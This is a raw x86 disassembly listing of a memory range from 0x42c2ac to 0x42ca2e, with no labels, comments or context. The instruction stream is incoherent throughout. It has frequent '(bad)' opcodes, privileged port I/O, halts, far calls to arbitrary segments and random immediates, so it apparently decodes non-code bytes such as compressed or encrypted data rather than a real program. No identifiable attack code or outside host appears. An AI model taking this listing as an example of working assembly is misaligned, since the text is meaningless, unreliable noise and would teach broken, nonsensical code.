  42c2ac:	sub    DWORD PTR [eax-0x1d],ecx
  42c2af:	or     DWORD PTR [ebp-0x7fef63b9],esi
  42c2b5:	inc    ebx
  42c2b6:	fcmovb st,st(6)
  42c2b8:	out    0x9c,al
  42c2ba:	jg     0x42c26a
  42c2bc:	out    dx,al
  42c2bd:	bound  eax,QWORD PTR [edi+0x17]
  42c2c0:	xchg   DWORD PTR [ecx+ebx*8],edi
  42c2c3:	lahf   
  42c2c4:	shr    DWORD PTR [ebp-0x42],0xd8
  42c2c8:	and    eax,ecx
  42c2ca:	rol    DWORD PTR [ecx],1
  42c2cc:	mov    cl,0x99
  42c2ce:	pop    ss
  42c2cf:	or     eax,0x449fb1ef
  42c2d4:	xor    bl,BYTE PTR [edx+edx*1]
  42c2d7:	mov    dh,0x17
  42c2d9:	jge    0x42c2b5
  42c2db:	pop    esp
  42c2dc:	mov    dh,bh
  42c2de:	cdq    
  42c2df:	or     al,0x64
  42c2e1:	pop    edx
  42c2e2:	sbb    edi,DWORD PTR [ebx]
  42c2e4:	sar    DWORD PTR [edi+0x59],cl
  42c2e7:	mov    ch,0xbd
  42c2e9:	ret    0xf11e
  42c2ec:	(bad)  
  42c2ed:	hlt    
  42c2ee:	out    0x6e,al
  42c2f0:	mov    edx,0x775e99b1
  42c2f5:	rol    BYTE PTR [edx],1
  42c2f7:	mov    ecx,0xba25cbe9
  42c2fc:	jmp    0x188c3e48
  42c301:	in     al,0x83
  42c303:	cmp    BYTE PTR [ecx+0x72],ah
  42c306:	adc    esp,edi
  42c308:	xchg   edi,eax
  42c309:	xchg   ecx,eax
  42c30a:	dec    edi
  42c30b:	sub    eax,0x2a1340a0
  42c310:	mov    dl,0xe0
  42c312:	inc    esp
  42c313:	test   al,0xec
  42c315:	mov    gs,esi
  42c317:	sub    BYTE PTR [esi+0x58],bl
  42c31a:	push   edx
  42c31b:	ror    BYTE PTR [edi-0x79],1
  42c31e:	fisttp DWORD PTR [edx+ebp*1+0x6a]
  42c322:	jnp    0x42c2b7
  42c324:	pop    ss
  42c325:	push   ds
  42c326:	inc    edx
  42c327:	add    al,BYTE PTR [edi-0x17]
  42c32a:	jo     0x42c318
  42c32c:	and    DWORD PTR [ecx-0x70],esp
  42c32f:	into   
  42c330:	push   esi
  42c331:	mov    cl,0x8d
  42c333:	test   BYTE PTR [ecx+eax*8+0x6d],0x23
  42c338:	adc    eax,ecx
  42c33a:	mov    ?,WORD PTR [ebx-0x2c1dd191]
  42c340:	xor    edx,DWORD PTR [ebx-0x16]
  42c343:	and    BYTE PTR [edi],cl
  42c345:	into   
  42c346:	cwde   
  42c347:	xor    DWORD PTR [edx-0x54],ebx
  42c34a:	lods   eax,DWORD PTR ds:[esi]
  42c34b:	xor    al,0xc5
  42c34d:	pusha  
  42c34e:	fisttp WORD PTR [eax]
  42c350:	mov    bh,0x8
  42c352:	arpl   WORD PTR [esp+edx*2],sp
  42c355:	sbb    BYTE PTR [esi-0x2a3f6b50],0xa8
  42c35c:	scas   eax,DWORD PTR es:[edi]
  42c35d:	push   cs
  42c35e:	mov    edx,0xc1c2cc49
  42c363:	push   0xfffffff8
  42c365:	popf   
  42c366:	jmp    0x42c384
  42c368:	fidiv  DWORD PTR [ebp+0x65335675]
  42c36e:	jmp    0xff23f2c
  42c373:	popa   
  42c374:	aad    0xd7
  42c376:	test   DWORD PTR [eax-0x2],0xe43819e9
  42c37d:	sbb    al,0xca
  42c37f:	jmp    0x42c33c
  42c381:	or     BYTE PTR [ecx],ah
  42c383:	lahf   
  42c384:	ret    0x966b
  42c387:	cmp    dh,BYTE PTR [edx-0x76f7f415]
  42c38d:	mov    esi,0x8f0124f2
  42c392:	int    0x95
  42c394:	jo     0x42c318
  42c396:	add    al,0xdf
  42c398:	(bad)  [edx-0x7e]
  42c39b:	add    edx,DWORD PTR [ebx-0x32bd8994]
  42c3a1:	outs   dx,BYTE PTR ds:[esi]
  42c3a2:	mov    edx,0xa453af70
  42c3a7:	cld    
  42c3a8:	shr    BYTE PTR [ebx],cl
  42c3aa:	push   edi
  42c3ab:	shl    DWORD PTR [esi-0x4e],0xfd
  42c3af:	outs   dx,DWORD PTR ds:[esi]
  42c3b0:	imul   esi,DWORD PTR [esi],0x761e8061
  42c3b6:	xor    bl,BYTE PTR [ecx-0x3b]
  42c3b9:	push   esi
  42c3ba:	mov    edx,0x21b01ca1
  42c3bf:	push   ebp
  42c3c0:	sub    BYTE PTR [edx-0x31],ah
  42c3c3:	cs jbe 0x8d752896
  42c3ca:	mov    ecx,0x6fbfc770
  42c3cf:	add    DWORD PTR [edi-0x623737fc],0xffffffbf
  42c3d6:	(bad)
  42c3d9:	aas    
  42c3da:	inc    edx
  42c3db:	add    BYTE PTR [eax+0x37fa6010],dh
  42c3e1:	dec    esi
  42c3e2:	and    dl,0xe4
  42c3e5:	sub    eax,0x2d2a0346
  42c3ea:	cmp    BYTE PTR [ebx],bh
  42c3ec:	mov    edi,0xb5fa0b58
  42c3f1:	shl    DWORD PTR [ecx+0x43],0xd0
  42c3f5:	inc    esi
  42c3f6:	ins    DWORD PTR es:[edi],dx
  42c3f7:	mov    al,ds:0x9a2bb4dd
  42c3fc:	mov    bh,0x34
  42c3fe:	mov    ds:0x6045675c,eax
  42c403:	dec    ebp
  42c404:	sbb    BYTE PTR ds:0xdf9c0a75,ch
  42c40a:	aas    
  42c40b:	test   edx,ecx
  42c40d:	aaa    
  42c40e:	out    dx,al
  42c40f:	lds    esp,FWORD PTR [ecx+0x9cc044b]
  42c415:	cli    
  42c416:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42c418:	imul   ebx,DWORD PTR [eax],0xffffffbd
  42c41b:	(bad)  
  42c41c:	(bad)
  42c41f:	sbb    DWORD PTR [esp+edi*8+0x13],edi
  42c423:	repz mov al,0xbe
  42c426:	jecxz  0x42c449
  42c428:	pop    esp
  42c429:	inc    ch
  42c42b:	gs cwde 
  42c42d:	dec    edx
  42c42e:	inc    ebp
  42c42f:	js     0x42c408
  42c431:	xlat   BYTE PTR ds:[ebx]
  42c432:	arpl   WORD PTR [esi-0x2c],sp
  42c435:	xchg   BYTE PTR [esi],al
  42c437:	mov    ebx,0xcc0e9782
  42c43c:	test   eax,0xcea1afda
  42c441:	lea    esp,[esi+eiz*4-0x76]
  42c445:	push   cs
  42c446:	mov    dl,0x6d
  42c448:	add    dh,dl
  42c44a:	inc    ebp
  42c44b:	mov    esp,0x1a02a3f0
  42c450:	aaa    
  42c451:	cmp    dh,BYTE PTR [eax-0x4c]
  42c454:	pop    eax
  42c455:	pop    DWORD PTR [ecx-0x2e1c35b]
  42c45b:	add    eax,0x82b0cd69
  42c460:	je     0x42c4c4
  42c462:	sbb    dh,bl
  42c464:	pop    ss
  42c465:	daa    
  42c466:	xor    edi,edi
  42c468:	dec    edi
  42c469:	mov    DWORD PTR [ebp+0x75ae4f32],edx
  42c46f:	dec    esi
  42c470:	push   0xab8b2002
  42c475:	sbb    DWORD PTR [edx+0x3333e0f9],eax
  42c47b:	xor    BYTE PTR [ebx-0x1c],dh
  42c47e:	mov    bh,0x40
  42c480:	scas   eax,DWORD PTR es:[edi]
  42c481:	out    dx,eax
  42c482:	out    0x7c,al
  42c484:	ja     0x42c4e4
  42c486:	js     0x42c42e
  42c488:	mov    esi,0x89261876
  42c48d:	in     eax,dx
  42c48e:	in     eax,0x3a
  42c490:	call   0xd880e7f6
  42c495:	pop    esp
  42c496:	sbb    eax,ecx
  42c498:	xchg   bx,ax
  42c49a:	cwde   
  42c49b:	fadd   QWORD PTR [esi]
  42c49d:	ficom  DWORD PTR [ecx]
  42c49f:	sahf   
  42c4a0:	lods   al,BYTE PTR ds:[esi]
  42c4a1:	scas   al,BYTE PTR es:[edi]
  42c4a2:	inc    ecx
  42c4a3:	fldcw  WORD PTR [edi]
  42c4a5:	jno    0x42c51f
  42c4a7:	pop    ebp
  42c4a8:	or     ebx,DWORD PTR [edx-0x1225138]
  42c4ae:	mov    esi,0x906fe19b
  42c4b3:	popa   
  42c4b4:	push   cs
  42c4b5:	fwait
  42c4b6:	xor    edi,esi
  42c4b8:	retf   
  42c4b9:	xlat   BYTE PTR ds:[ebx]
  42c4ba:	xor    BYTE PTR [ecx],dh
  42c4bc:	inc    edx
  42c4bd:	mov    ds:0x49cde68a,al
  42c4c2:	jo     0x42c4fc
  42c4c4:	dec    eax
  42c4c5:	or     edx,eax
  42c4c7:	nop
  42c4c8:	sbb    BYTE PTR [eax],dl
  42c4ca:	in     al,0xf9
  42c4cc:	cwde   
  42c4cd:	enter  0x6058,0x77
  42c4d1:	retf   0xdfb0
  42c4d4:	fadd   DWORD PTR [eax-0x3a602026]
  42c4da:	ins    BYTE PTR es:[edi],dx
  42c4db:	lods   eax,DWORD PTR ds:[esi]
  42c4dc:	mov    WORD PTR [ebp*2-0x3e25b46a],ds
  42c4e3:	lahf   
  42c4e4:	rol    dh,cl
  42c4e6:	int3   
  42c4e7:	je     0x42c540
  42c4e9:	dec    esp
  42c4ea:	std    
  42c4eb:	lds    ebx,FWORD PTR [edx]
  42c4ed:	sub    ebp,DWORD PTR [ebp-0x72534473]
  42c4f3:	xchg   ebx,eax
  42c4f4:	cmp    edi,ebp
  42c4f6:	mov    al,0xf3
  42c4f8:	mov    gs,WORD PTR [ebp+0x5c]
  42c4fb:	lea    ebx,ss:[eax+0x58]
  42c4ff:	xor    ch,BYTE PTR [ebx+0xc]
  42c502:	xchg   edi,eax
  42c503:	dec    edi
  42c504:	jae    0x42c4c2
  42c506:	pushf  
  42c507:	aaa    
  42c508:	dec    esi
  42c509:	(bad)  
  42c50a:	jo     0x42c564
  42c50c:	mov    dl,0x86
  42c50e:	mov    ecx,0x8e1ff660
  42c513:	mov    BYTE PTR [eax+ebp*2-0x52b11cb6],dh
  42c51a:	inc    edx
  42c51b:	call   0xbdd09f3a
  42c520:	in     eax,0x65
  42c522:	dec    ebp
  42c523:	and    al,0xe
  42c525:	dec    esp
  42c526:	mov    ah,0x39
  42c528:	inc    esp
  42c529:	add    ch,BYTE PTR ds:0xa4bb3a83
  42c52f:	pop    esi
  42c530:	dec    edi
  42c531:	xor    al,0x40
  42c533:	jns    0x42c4d3
  42c535:	xchg   esp,eax
  42c536:	rcr    DWORD PTR ds:0x7178021b,0x48
  42c53d:	or     ebx,0x4aa21a22
  42c543:	lock cmp ebx,DWORD PTR [ebp-0x67542710]
  42c54a:	daa    
  42c54b:	repz test al,0xa1
  42c54e:	and    DWORD PTR [eax],eax
  42c550:	mov    ebx,0x3693a4f0
  42c555:	in     eax,dx
  42c556:	and    esi,DWORD PTR [ebx]
  42c558:	mov    ah,0xec
  42c55a:	mov    ch,0x23
  42c55c:	adc    BYTE PTR [ecx],ah
  42c55e:	sbb    ebx,DWORD PTR [ebx+0x5edbe904]
  42c564:	mov    esi,0xd3d33eac
  42c569:	mov    edi,DWORD PTR [edx+0x30c26c03]
  42c56f:	inc    edi
  42c570:	pushf  
  42c571:	cmp    cl,dh
  42c573:	adc    eax,0x73da8390
  42c578:	mov    BYTE PTR [edi-0xd],bh
  42c57b:	(bad)  
  42c57d:	data16 mov ch,0x43
  42c580:	ret    
  42c581:	data16 add BYTE PTR [ebx],ah
  42c584:	dec    edx
  42c585:	arpl   WORD PTR [edi+0x9],bx
  42c588:	out    dx,al
  42c589:	add    eax,0xd3984c8
  42c58e:	(bad)  
  42c590:	push   0xffce6911
  42c595:	mov    ecx,0xe75a1e19
  42c59a:	cld    
  42c59b:	out    0x5f,eax
  42c59d:	inc    edi
  42c59e:	clc    
  42c59f:	lahf   
  42c5a0:	sub    DWORD PTR [eax],0x7e
  42c5a3:	jae    0x42c5b6
  42c5a5:	outs   dx,BYTE PTR ds:[esi]
  42c5a6:	cmp    al,cl
  42c5a8:	mov    edi,0xece1db4d
  42c5ad:	push   cs
  42c5ae:	and    BYTE PTR [edi+0x410ce12f],dl
  42c5b4:	std    
  42c5b5:	lea    eax,[ecx+0x1b]
  42c5b8:	into   
  42c5b9:	sub    al,0x15
  42c5bb:	ror    DWORD PTR [ebp-0x59],1
  42c5be:	fiadd  WORD PTR [ebp+0x28]
  42c5c1:	mov    al,ds:0x66a9ab5c
  42c5c6:	inc    ecx
  42c5c7:	sub    dh,0x56
  42c5ca:	xchg   esp,eax
  42c5cb:	int    0xd8
  42c5cd:	jecxz  0x42c562
  42c5cf:	push   eax
  42c5d0:	xor    eax,0x95e8d199
  42c5d5:	nop
  42c5d6:	es je  0x42c5fd
  42c5d9:	js     0x42c5fe
  42c5db:	cmp    ebp,DWORD PTR [eax-0x6f]
  42c5de:	add    al,BYTE PTR [ecx+0x9]
  42c5e1:	mov    bl,0x39
  42c5e3:	sbb    DWORD PTR [ebx-0x41af060a],ebx
  42c5e9:	jno    0x42c5f8
  42c5eb:	push   edx
  42c5ec:	mov    DWORD PTR [eax],ebp
  42c5ee:	call   0x6f14:0x3ed4fb37
  42c5f5:	mov    esp,0xa5380fe3
  42c5fa:	call   0x9af5f683
  42c5ff:	add    BYTE PTR [esi],0xf4
  42c602:	nop
  42c603:	addr16 push ss
  42c605:	push   edi
  42c606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c607:	or     BYTE PTR [ebx-0x73],0x86
  42c60b:	mul    al
  42c60d:	sbb    al,0xf2
  42c60f:	loop   0x42c64b
  42c611:	add    dh,ch
  42c613:	jae    0x42c5db
  42c615:	pop    ebp
  42c616:	add    DWORD PTR ds:0xdafdd9cc,0xebf2b8e3
  42c620:	inc    DWORD PTR [eax+0x6d]
  42c623:	and    DWORD PTR ds:0xf56ed937,ecx
  42c629:	mov    bh,0xc5
  42c62b:	and    BYTE PTR ds:0x1cdbe016,ch
  42c631:	(bad)  
  42c632:	rcr    edi,1
  42c634:	lahf   
  42c635:	inc    esp
  42c636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c637:	push   esp
  42c638:	inc    ebx
  42c639:	xor    bl,BYTE PTR [ebx-0x33d8463d]
  42c63f:	clc    
  42c640:	ret    0xf393
  42c643:	enter  0xb615,0x60
  42c647:	loopne 0x42c65e
  42c649:	sbb    edx,esi
  42c64b:	inc    eax
  42c64c:	adc    DWORD PTR ds:0x3941ad0f,ebx
  42c652:	outs   dx,BYTE PTR ds:[esi]
  42c653:	inc    ebp
  42c654:	bound  esp,QWORD PTR [eax*4-0x78f8cdb4]
  42c65b:	fild   WORD PTR [esi]
  42c65d:	sub    DWORD PTR [edi-0x3b],edx
  42c660:	cdq    
  42c661:	shl    DWORD PTR [esi+esi*4],1
  42c664:	xor    al,0x17
  42c666:	push   eax
  42c667:	int3   
  42c668:	and    al,0x31
  42c66a:	aaa    
  42c66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c66c:	mov    al,ds:0x52e32a58
  42c671:	xchg   BYTE PTR [esi+ebx*4+0x1e67c2ec],dh
  42c678:	ins    BYTE PTR es:[edi],dx
  42c679:	test   ebx,edi
  42c67b:	(bad)  
  42c67c:	add    BYTE PTR [edx],ch
  42c67e:	stc    
  42c67f:	xor    al,0x3c
  42c681:	lds    eax,FWORD PTR [ebx+0x67807bc0]
  42c687:	jmp    0xcc164200
  42c68c:	add    ebx,DWORD PTR ds:0xb8f9a4d6
  42c692:	mov    al,ss:0xcf74e839
  42c698:	inc    esi
  42c699:	inc    edi
  42c69a:	and    BYTE PTR [edi+0x2fea72be],dl
  42c6a0:	adc    edi,DWORD PTR [ecx]
  42c6a2:	mov    al,0xbd
  42c6a4:	iret   
  42c6a5:	push   ebp
  42c6a6:	sbb    BYTE PTR [eax+ecx*1+0x5caf65c3],0x25
  42c6ae:	leave  
  42c6af:	mov    ecx,0x2baa4612
  42c6b4:	scas   al,BYTE PTR es:[edi]
  42c6b5:	cwde   
  42c6b6:	in     al,0xee
  42c6b8:	dec    ecx
  42c6b9:	bound  eax,QWORD PTR [edx-0x142e6d49]
  42c6bf:	outs   dx,DWORD PTR ds:[esi]
  42c6c0:	es or  eax,0xca90857f
  42c6c6:	xor    ebp,ebx
  42c6c8:	or     eax,0xafaf7395
  42c6ce:	mov    edx,eax
  42c6d0:	in     al,dx
  42c6d1:	jne    0x42c6b6
  42c6d3:	mov    eax,ds:0x8b0fdf87
  42c6d8:	mov    ds:0x45c2ea8c,eax
  42c6dd:	adc    al,0x5e
  42c6df:	sbb    al,0x81
  42c6e1:	xchg   DWORD PTR [esi],ecx
  42c6e3:	ret    0xada4
  42c6e6:	add    edi,ebp
  42c6e8:	ret    
  42c6e9:	jecxz  0x42c6d3
  42c6eb:	int3   
  42c6ec:	mov    ecx,fs
  42c6ee:	ins    BYTE PTR es:[edi],dx
  42c6ef:	ret    0xe182
  42c6f2:	mov    ah,0x15
  42c6f4:	imul   DWORD PTR [ebp+0x73]
  42c6f7:	mov    al,ds:0x1d0fa378
  42c6fc:	pop    ds
  42c6fd:	sbb    esp,eax
  42c6ff:	sub    DWORD PTR [ebx-0x73],ecx
  42c702:	ss ret 0xa6f2
  42c706:	dec    esi
  42c707:	inc    ecx
  42c708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c709:	cld    
  42c70a:	sub    ch,BYTE PTR [eax-0x79]
  42c70d:	jbe    0x42c725
  42c70f:	jp     0x42c753
  42c711:	mov    ecx,DWORD PTR [ecx]
  42c713:	cmp    dh,bl
  42c715:	sub    eax,0x5723367
  42c71a:	sbb    BYTE PTR [edi+0x7c],dh
  42c71d:	loop   0x42c74b
  42c71f:	inc    ecx
  42c720:	out    0x52,al
  42c722:	in     al,0x6c
  42c724:	inc    ecx
  42c725:	inc    eax
  42c726:	outs   dx,DWORD PTR ds:[esi]
  42c727:	scas   eax,DWORD PTR es:[edi]
  42c728:	pop    esi
  42c729:	xchg   dh,bl
  42c72b:	pop    ecx
  42c72c:	aaa    
  42c72d:	or     al,0xdd
  42c72f:	push   es
  42c730:	into   
  42c731:	push   0x414ae7e3
  42c736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c737:	cli    
  42c738:	loop   0x42c6ea
  42c73a:	sub    BYTE PTR [edi-0xe18f53a],ah
  42c740:	jge    0x42c6cf
  42c742:	retf   
  42c743:	pop    ds
  42c744:	mov    edx,0xa3b8b441
  42c749:	jne    0x42c77e
  42c74b:	rol    DWORD PTR [ebp+0xe],cl
  42c74e:	dec    eax
  42c74f:	adc    bh,BYTE PTR [esi+0x76c16ad1]
  42c755:	xchg   ecx,eax
  42c756:	or     cl,BYTE PTR [eax-0x1a]
  42c759:	dec    ebp
  42c75a:	fisub  WORD PTR [edx+eax*8-0x4f]
  42c75e:	and    eax,0xd5cc8f19
  42c763:	lock dec edi
  42c765:	fcmovnu st,st(2)
  42c767:	xor    BYTE PTR [esi-0x506cde4b],bl
  42c76d:	test   al,0x75
  42c76f:	icebp  
  42c770:	adc    eax,0xd3031787
  42c775:	ret    
  42c776:	push   0xffffffa8
  42c778:	clc    
  42c779:	jge    0x42c7f6
  42c77b:	ficom  DWORD PTR [ecx+0x19]
  42c77e:	sbb    bh,al
  42c780:	dec    esp
  42c781:	push   ebp
  42c782:	ret    0x358e
  42c785:	inc    ecx
  42c786:	mov    eax,0xeab80e22
  42c78b:	ins    DWORD PTR es:[edi],dx
  42c78c:	mov    eax,0xf7812472
  42c791:	pop    esp
  42c792:	push   ds
  42c793:	push   ecx
  42c794:	pop    ss
  42c795:	clc    
  42c796:	icebp  
  42c797:	jns    0x42c745
  42c799:	mov    al,0xe1
  42c79b:	sub    al,0x41
  42c79d:	das    
  42c79e:	nop
  42c79f:	bound  eax,QWORD PTR [ecx-0x40]
  42c7a2:	imul   ebx,DWORD PTR [edi+0x3510ce83],0xf
  42c7a9:	ffree  st(6)
  42c7ab:	test   DWORD PTR [eax-0x9],0x846473fc
  42c7b2:	jge    0x42c7f5
  42c7b4:	(bad)  
  42c7b5:	into   
  42c7b6:	fst    DWORD PTR [ecx+0x6d]
  42c7b9:	push   cs
  42c7ba:	(bad)  
  42c7bb:	lock inc esp
  42c7bd:	mov    cs,WORD PTR [edi+eiz*8+0x16]
  42c7c1:	(bad)  
  42c7c3:	std    
  42c7c4:	jecxz  0x42c7a3
  42c7c6:	sub    ah,bh
  42c7c8:	jno    0x42c7dc
  42c7ca:	mov    ch,0xc9
  42c7cc:	inc    ecx
  42c7cd:	fcom   DWORD PTR [ebx-0x3681e775]
  42c7d3:	test   dh,al
  42c7d5:	lods   eax,DWORD PTR ds:[esi]
  42c7d6:	push   cs
  42c7d7:	mov    WORD PTR [eax+edx*4],cs
  42c7da:	mov    al,0x22
  42c7dc:	repz loopne 0x42c7ab
  42c7df:	lds    ecx,FWORD PTR [esi+eiz*8]
  42c7e2:	imul   ebx,DWORD PTR [edi+ecx*1],0xe3f15975
  42c7e9:	(bad)  
  42c7ea:	sbb    al,0x36
  42c7ec:	xchg   edx,eax
  42c7ed:	add    al,bh
  42c7ef:	fst    QWORD PTR [edx+0x5]
  42c7f2:	(bad)  
  42c7f4:	push   ss
  42c7f5:	add    al,0xed
  42c7f7:	xor    eax,0xcb44a5cc
  42c7fc:	das    
  42c7fd:	or     edi,ebp
  42c7ff:	ins    DWORD PTR es:[edi],dx
  42c800:	mov    ch,0x62
  42c802:	cmp    BYTE PTR [ecx+0x45],dl
  42c805:	or     eax,ecx
  42c807:	and    DWORD PTR [ecx+0x122ea3d],edx
  42c80d:	xchg   ecx,eax
  42c80e:	daa    
  42c80f:	and    eax,0x53d42311
  42c814:	mov    ch,0x58
  42c816:	rol    BYTE PTR [esi+0x76],1
  42c819:	push   ebp
  42c81a:	lock outs dx,DWORD PTR ds:[esi]
  42c81c:	scas   eax,DWORD PTR es:[edi]
  42c81d:	test   edx,esp
  42c81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c820:	mov    ebx,0xf6a30c8f
  42c825:	lods   eax,DWORD PTR ds:[esi]
  42c826:	sub    edi,DWORD PTR [eax-0x12]
  42c829:	mov    cl,0xe1
  42c82b:	adc    eax,0x9019c7c1
  42c830:	cmp    al,0x6e
  42c832:	push   esi
  42c833:	adc    ah,ch
  42c835:	shl    ah,0xfd
  42c838:	scas   al,BYTE PTR es:[edi]
  42c839:	xchg   BYTE PTR [ecx],al
  42c83b:	fst    DWORD PTR [ebx-0x32]
  42c83e:	mov    eax,ds:0x62e8de31
  42c843:	sbb    BYTE PTR [ecx+eax*8-0x3b],0xa9
  42c848:	rcl    bh,0xbf
  42c84b:	repnz or edi,DWORD PTR [esi+esi*8+0x3282ff9b]
  42c853:	sahf   
  42c854:	(bad)  
  42c855:	cli    
  42c856:	(bad)  
  42c857:	mov    esi,0xff1f8b8b
  42c85c:	sub    BYTE PTR [esi-0x21],dl
  42c85f:	xlat   BYTE PTR ds:[ebx]
  42c860:	or     eax,0x5484d66b
  42c865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c866:	pop    ds
  42c867:	mov    ds:0xf8d8b227,eax
  42c86c:	fisubr WORD PTR [eax]
  42c86e:	in     al,dx
  42c86f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c870:	mov    bl,0x70
  42c872:	sti    
  42c873:	adc    eax,0xef8235c8
  42c878:	xchg   ebp,eax
  42c879:	push   ss
  42c87a:	sub    BYTE PTR [ebx+0x4e],dl
  42c87d:	fs loop 0x42c88a
  42c880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c881:	sti    
  42c882:	mov    bl,0x70
  42c884:	or     BYTE PTR gs:0xcd4fedd0,cl
  42c88b:	call   0x2a9f:0x30142991
  42c892:	nop
  42c893:	inc    esp
  42c894:	lods   al,BYTE PTR ds:[esi]
  42c895:	mov    ds:0x65a34856,al
  42c89a:	jne    0x42c8c7
  42c89c:	sahf   
  42c89d:	jp     0x42c91d
  42c89f:	adc    dh,BYTE PTR [esi-0x41]
  42c8a2:	sbb    eax,0xcdf034f5
  42c8a7:	sub    eax,0xc9bbac25
  42c8ac:	add    edx,DWORD PTR [ebx-0x51]
  42c8af:	add    al,0x69
  42c8b1:	jne    0x42c8b8
  42c8b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8b4:	sahf   
  42c8b5:	adc    esp,edi
  42c8b7:	call   0x2174:0x3d276676
  42c8be:	mov    bl,0x7c
  42c8c0:	lock cmp ebp,edi
  42c8c3:	xor    eax,0x4e5a1da9
  42c8c8:	stc    
  42c8c9:	rol    DWORD PTR fs:[esi+0x736b3ab5],cl
  42c8d0:	mov    ds:0xd4e8c423,eax
  42c8d5:	loope  0x42c8c1
  42c8d7:	mov    edi,0x10d1e845
  42c8dc:	arpl   WORD PTR [ebp+0x3876bd5b],sp
  42c8e2:	fdiv   DWORD PTR [esi+0x6b29c6e7]
  42c8e8:	jmp    0x3d36f5ef
  42c8ed:	imul   esi,DWORD PTR [edx],0xd6fdae6d
  42c8f3:	inc    edi
  42c8f4:	loopne 0x42c89f
  42c8f6:	mov    bl,0x61
  42c8f8:	cli    
  42c8f9:	mov    cl,0x7f
  42c8fb:	inc    edi
  42c8fc:	stc    
  42c8fd:	mov    DWORD PTR [ecx],edi
  42c8ff:	pop    eax
  42c900:	daa    
  42c901:	hlt    
  42c902:	or     eax,0x6a651ac4
  42c907:	jne    0x42c909
  42c909:	adc    ah,BYTE PTR [ecx]
  42c90b:	lahf   
  42c90c:	sub    eax,0xbc00f77f
  42c911:	sbb    eax,0x5eb5704d
  42c916:	(bad)  
  42c917:	hlt    
  42c918:	mov    eax,ds:0xa3e4e22f
  42c91d:	xchg   edi,eax
  42c91e:	icebp  
  42c91f:	(bad)  
  42c921:	dec    edi
  42c922:	loopne 0x42c95e
  42c924:	xchg   edi,eax
  42c925:	or     eax,0xb83c3b9b
  42c92a:	push   edx
  42c92b:	mov    cl,0xe0
  42c92d:	into   
  42c92e:	psrlq  mm7,QWORD PTR [esi+esi*8-0x64221e1b]
  42c936:	(bad)  
  42c937:	mov    ecx,edx
  42c939:	repnz inc ecx
  42c93b:	adc    eax,DWORD PTR [edi]
  42c93d:	jge    0x42c983
  42c93f:	(bad)  [esp+ebx*4+0x7adec909]
  42c946:	mov    ebx,0xd0cdfcf6
  42c94b:	jns    0x42c95f
  42c94d:	mov    esp,0x99b373da
  42c952:	push   eax
  42c953:	sbb    esi,0xbf0f86b1
  42c959:	mov    cl,0xfb
  42c95b:	das    
  42c95c:	xchg   ebx,eax
  42c95d:	pusha  
  42c95e:	sbb    ah,BYTE PTR [ecx-0x74ed6e41]
  42c964:	repz and al,0xc4
  42c967:	pushf  
  42c968:	(bad)  
  42c969:	mov    eax,ds:0x6931a9d3
  42c96e:	sub    BYTE PTR [edi-0x184a7903],dl
  42c974:	js     0x42c9be
  42c976:	fwait
  42c977:	mov    al,0xef
  42c979:	nop
  42c97a:	stos   BYTE PTR es:[edi],al
  42c97b:	lods   al,BYTE PTR ds:[esi]
  42c97c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c97d:	sbb    eax,0xc41e85ba
  42c982:	jbe    0x42c927
  42c984:	jo     0x42c980
  42c986:	sub    dh,al
  42c988:	mov    ah,0x59
  42c98a:	or     cl,ch
  42c98c:	nop
  42c98d:	test   eax,0xd761c990
  42c992:	test   al,0x13
  42c994:	jae    0x42c9eb
  42c996:	or     edi,DWORD PTR [esi-0x44]
  42c999:	scas   eax,DWORD PTR es:[edi]
  42c99a:	cmovg  ebx,DWORD PTR [ebp+0x5e]
  42c99e:	ret    0x9a54
  42c9a1:	ins    BYTE PTR es:[edi],dx
  42c9a2:	pop    esi
  42c9a3:	inc    ecx
  42c9a4:	mov    edi,0xa9422d5e
  42c9a9:	cs push ebx
  42c9ab:	mov    al,ds:0x84dadbed
  42c9b0:	mov    bl,0x83
  42c9b2:	xor    ebp,eax
  42c9b4:	repnz call 0x9d67:0x7c7aeb0
  42c9bc:	adc    ebx,DWORD PTR [ecx-0x79]
  42c9bf:	add    BYTE PTR [ebp+0x79dc2993],0x7c
  42c9c6:	dec    eax
  42c9c7:	jge    0x42c979
  42c9c9:	pop    edi
  42c9ca:	iret   
  42c9cb:	pusha  
  42c9cc:	test   DWORD PTR [esi],edi
  42c9ce:	sahf   
  42c9cf:	jnp    0x42c9f4
  42c9d1:	sub    al,0x40
  42c9d3:	iret   
  42c9d4:	add    ah,ah
  42c9d6:	mov    cl,0xb1
  42c9d8:	popf   
  42c9d9:	iret   
  42c9da:	mov    ds,WORD PTR [ebp-0x32]
  42c9dd:	sti    
  42c9de:	mul    BYTE PTR [bp+di]
  42c9e1:	sahf   
  42c9e2:	sub    esi,esi
  42c9e4:	call   0xf265:0xf3345a73
  42c9eb:	fldcw  WORD PTR [eax-0x30]
  42c9ee:	add    al,0xdd
  42c9f0:	jne    0x42c9d1
  42c9f2:	pop    eax
  42c9f3:	pop    es
  42c9f4:	imul   DWORD PTR [esi-0x5ee19bba]
  42c9fa:	ret    
  42c9fb:	fisttp WORD PTR [ebx+0x33]
  42c9fe:	cmp    edx,DWORD PTR [esi-0x37685a3b]
  42ca04:	sbb    al,0x5e
  42ca06:	push   edi
  42ca07:	(bad)  
  42ca08:	sub    edx,DWORD PTR [ebx+0x5937d435]
  42ca0e:	or     ecx,eax
  42ca10:	leave  
  42ca11:	sub    BYTE PTR [ebp+0x64],dl
  42ca14:	fmul   DWORD PTR [eax]
  42ca16:	adc    DWORD PTR [edi-0x4d4090bc],edx
  42ca1c:	cmp    bh,0x9d
  42ca1f:	sub    eax,0x213663c1
  42ca24:	in     al,0x90
  42ca26:	loope  0x42c9bd
  42ca28:	adc    eax,0x86184858
  42ca2d:	lods   eax,DWORD PTR ds:[esi]
  42ca2e:	adc    bh,BYTE PTR [edx-0x33bbd983]
